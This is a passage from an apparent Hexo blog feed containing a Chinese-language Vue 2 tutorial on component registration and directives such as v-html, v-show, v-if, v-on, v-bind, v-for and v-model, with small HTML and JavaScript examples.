</li><li>在使用的组件内导入并注册</li><li>当成html标签使用<code>&lt;HmHeader&gt;&lt;/HmHeader&gt;</code></li><li>注意命名规范：大驼峰命名法</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323225716.png" alt="image.png"></p><p><strong>全局注册</strong>：所有组件内都能使用</p><ol><li>创建 .vue 文件 (三个组成部分) </li><li>main.js 中进行全局注册</li><li>当成html标签使用<code>&lt;HmButton&gt;&lt;/HmButton&gt;</code></li><li>注意命名规范：大驼峰命名法</li><li>一般都用局部注册，如果发现确实是通用组件，再定义到全局。</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323230417.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue-指令</title>
      <link href="/2024/03/23/Vue-%E6%8C%87%E4%BB%A4/"/>
      <url>/2024/03/23/Vue-%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue-指令"><a href="#Vue-指令" class="headerlink" title="Vue 指令"></a>Vue 指令</h1><p><strong>概念</strong>：指令是 Vue 提供的带有 v- 前缀的特殊标签属性。</p><p>Vue 会根据不同的<strong>指令</strong>，针对标签实现不同的<strong>功能</strong>，提高操作 DOM 的效率</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Vue 指令： v- 前缀的标签属性 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>vue 中的指令按照不同的用途可以分为如下 6 大类：</p><ul><li>内容渲染指令（v-html、v-text）</li><li>条件渲染指令（v-show、v-if、v-else、v-else-if）</li><li>事件绑定指令（v-on）</li><li>属性绑定指令 （v-bind）</li><li>双向绑定指令（v-model）</li><li>列表渲染指令（v-for）</li></ul><h1 id="内容渲染指令"><a href="#内容渲染指令" class="headerlink" title="内容渲染指令"></a>内容渲染指令</h1><p><strong>内容渲染指令</strong>用来辅助开发者渲染 DOM 元素的文本内容。</p><p>常用的内容渲染指令有如下2 个：</p><p><strong>v-text</strong>（类似innerText）：</p><ul><li>使用语法：<code>&lt;p v-text=&quot;uname&quot;&gt;hello&lt;/p&gt;</code>，意思是将 uame 值渲染到 p 标签中</li><li>类似 innerText，使用该语法，会覆盖 p 标签原有内容</li></ul><p><strong>v-html</strong>（类似 innerHTML）：</p><ul><li>使用语法：<code>&lt;p v-html=&quot;intro&quot;&gt;hello&lt;/p&gt;</code>，意思是将 intro 值渲染到 p 标签中</li><li>类似 innerHTML，使用该语法，会覆盖 p 标签原有内容</li><li>类似 innerHTML，使用该语法，能够将HTML标签的样式呈现出来。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>登录信息<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span>=<span class="string">&quot;uname&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span>=<span class="string">&quot;intro&quot;</span>&gt;</span>简介：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">uname</span>: <span class="string">&#x27;Alien&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">intro</span>: <span class="string">&#x27;&lt;h2&gt;一个&lt;strong&gt;来自M78&lt;/strong&gt;的程序员&lt;/h2&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="条件渲染指令"><a href="#条件渲染指令" class="headerlink" title="条件渲染指令"></a>条件渲染指令</h1><p><strong>条件判断指令</strong>，用来辅助开发者按需控制 DOM 的显示与隐藏。</p><p><strong>v-show</strong>：</p><ol><li>作用： 控制元素显示隐藏 </li><li>语法： <code>v-show = &quot;表达式&quot;</code> 表达式值 true 显示， false 隐藏 </li><li><strong>原理</strong>： 切换 <code>display:none</code> 控制显示隐藏 </li><li>场景： 频繁切换显示隐藏的场景</li></ol><p><strong>v-if</strong>：</p><ol><li>作用： 控制元素显示隐藏（条件渲染） </li><li>语法： <code>v-if = &quot;表达式&quot;</code> 表达式值 true 显示， false 隐藏 </li><li><strong>原理</strong>： 基于条件判断，是否<strong>创建</strong>或<strong>移除</strong>元素节点 </li><li>场景： 要么显示，要么隐藏，不频繁切换的场景</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>登录信息<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span>=<span class="string">&quot;uname&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span>=<span class="string">&quot;intro&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>简介：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">uname</span>: <span class="string">&#x27;Alien&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">intro</span>: <span class="string">&#x27;&lt;h2&gt;一个&lt;strong&gt;来自M78&lt;/strong&gt;的程序员&lt;/h2&gt;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">flag</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323103749.png" alt="image.png"></p><p><strong>v-else&amp;v-else-if</strong>：</p><ol><li>作用： 辅助 v-if 进行判断渲染 </li><li>语法： <code>v-else</code>、<code>v-else-if = &quot;表达式&quot;</code> </li><li>注意： 需要紧挨着 v-if 一起使</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;score &gt;= 90&quot;</span>&gt;</span>优秀<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-else-if</span>=<span class="string">&quot;score &gt;= 60&quot;</span>&gt;</span>一般<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-else</span>&gt;</span>差劲<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">score</span>: <span class="number">85</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="事件绑定指令"><a href="#事件绑定指令" class="headerlink" title="事件绑定指令"></a>事件绑定指令</h1><p><strong>事件绑定指令</strong>是用来注册DOM事件的</p><p><strong>作用</strong>： 注册事件 </p><p><strong>语法</strong>：</p><ol><li><code>v-on:事件名 = &quot;内联语句&quot; </code></li><li><code>v-on:事件名 = &quot;methods中的函数名&quot;</code> </li><li><code>v-on</code>简写：@事件名</li></ol><p><strong>内联语句</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;count--&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;count++&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">count</span>: <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240323105839.png" alt="image.png"></p><p><strong>methods中的函数名</strong>：</p><ul><li>事件处理函数应该写到一个跟data同级的配置项<code>methods</code>中</li><li><code>methods</code>中的函数内部的this都指向Vue实例</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;fn&quot;</span>&gt;</span>开关<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;fn2(-10)&quot;</span>&gt;</span>-10<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;fn2(10)&quot;</span>&gt;</span>+10<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">&quot;flag&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;count--&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;count++&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">count</span>: <span class="number">100</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">flag</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fn</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">app.<span class="property">flag</span> = !app.<span class="property">flag</span> <span class="comment">// 可以通过按钮控制flag的值，实现display的切换</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fn2</span>(<span class="params">a</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">count</span> += a <span class="comment">// 可以传递参数，this指向vue实例</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="属性绑定指令"><a href="#属性绑定指令" class="headerlink" title="属性绑定指令"></a>属性绑定指令</h1><ol><li>作用： 动态的设置html的标签属性，比如：src、url、title</li><li>语法： <code>v-bind:属性名=&quot;表达式&quot; </code></li><li>注意： 简写形式 <code>:属性名=&quot;表达式&quot;</code></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;url&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">url</span>: <span class="string">&#x27;图片路径&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="操作class"><a href="#操作class" class="headerlink" title="操作class"></a>操作class</h2><p><strong>语法</strong>： <code>:class = &quot;对象/数组&quot;</code></p><ol><li>对象 → 键就是类名，值是布尔值。如果值为 true，有这个类，否则没有这个类</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;&#123; 类名1: 布尔值, 类名2: 布尔值 &#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>适用场景：一个类名，来回切换</p><ol start="2"><li>数组 → 数组中所有的类，都会添加到盒子上，本质就是一个 class 列表 v-bind 对于样式控制的增强 - 操作class</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;[ 类名1, 类名2, 类名3 ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>适用场景：批量添加或删除类</p><h2 id="操作style"><a href="#操作style" class="headerlink" title="操作style"></a>操作style</h2><p><strong>语法</strong>：<code>:style = &quot;样式对象&quot;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123; CSS属性名1: CSS属性值, CSS属性名2: CSS属性值 &#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>适用场景：某个具体属性的动态设置</p><h1 id="列表渲染指令"><a href="#列表渲染指令" class="headerlink" title="列表渲染指令"></a>列表渲染指令</h1><p><strong>列表渲染指令</strong> v-for ，用来辅助开发者基于一个数组来循环渲染一个列表结构。</p><p>v-for 指令： <code>v-for=&quot;(item, index) in arr&quot;</code> </p><ul><li>item 是数组中的每一项</li><li>index 是每一项的索引，不需要可以省略</li><li>arr 是被遍历的数组</li></ul><p>此语法可以遍历<strong>数组、对象和数字</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>忍者村首领<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in boss&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.village &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">fn(item.id)</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">boss</span>: [</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">village</span>: <span class="string">&#x27;木叶村火影&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;纲手&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">village</span>: <span class="string">&#x27;砂隐村风影&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;我爱罗&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">3</span>, <span class="attr">village</span>: <span class="string">&#x27;雾隐村水影&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;照美冥&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">4</span>, <span class="attr">village</span>: <span class="string">&#x27;云隐村雷影&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;艾&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">5</span>, <span class="attr">village</span>: <span class="string">&#x27;岩隐村土影&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;打野木&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">]</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fn</span>(<span class="params">id</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">boss</span> = <span class="variable language_">this</span>.<span class="property">boss</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">id</span> !== id)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// filter会根据要求生成新的数组，然后需要赋值回去</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>v-for 中的 key</strong>：</p><p><strong>语法：</strong> <code>key=&quot;唯一值&quot;</code></p><p><strong>作用</strong>：给列表项添加的<strong>唯一标识</strong>。便于Vue进行列表项的<strong>正确排序复用</strong>。</p><p>v-for 的默认行为会尝试原地修改元素（<strong>就地复用</strong>），只是将元素内容修改，还保留原来的元素</p><h1 id="双向绑定指令"><a href="#双向绑定指令" class="headerlink" title="双向绑定指令"></a>双向绑定指令</h1><p>所谓<strong>双向绑定</strong>就是：</p><ol><li>数据改变后，呈现的页面结果会更新</li><li>页面结果更新后，数据也会随之而变</li></ol><p><strong>作用</strong>：给 表单元素 使用, 双向数据绑定</p><ol><li>数据变化 → 视图自动更新</li><li>视图变化 → 数据自动更新</li></ol><p><strong>语法</strong>：<code>v-model = &#39;变量&#39;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 